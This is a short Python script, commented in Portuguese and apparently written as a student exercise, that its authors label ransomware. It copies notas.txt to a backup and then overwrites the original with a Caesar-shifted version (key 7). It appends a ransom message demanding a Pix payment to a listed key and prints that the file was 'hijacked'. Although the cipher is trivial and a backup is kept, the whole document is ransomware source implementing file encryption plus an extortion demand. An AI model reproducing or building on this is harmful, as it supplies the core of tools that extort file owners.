#   Ransomware para criptografia
#   
#   Desenvolvido por Pedro Figueira, Jean Alves, Vinicius Bonicio, Kathellin Ribeiro

chave = 7

f = open("notas.txt", "r")

texto = f.read()

g = open("backup.txt", "w")
g.write(texto)
g.close()

criptografado = ""

for caracter in texto:
    criptografado = criptografado + chr(ord(caracter) + chave)

criptografado = criptografado + "\n\nEste arquivo foi sequestrado! Para resgatar-lo faça um pix para\n0bc75dc0-823d-47e3-b290-c6c9c8abf459"

f = open("notas.txt", "w")
f.write(criptografado)
f.close()

print("Arquivo texto sequestrado com sucesso!")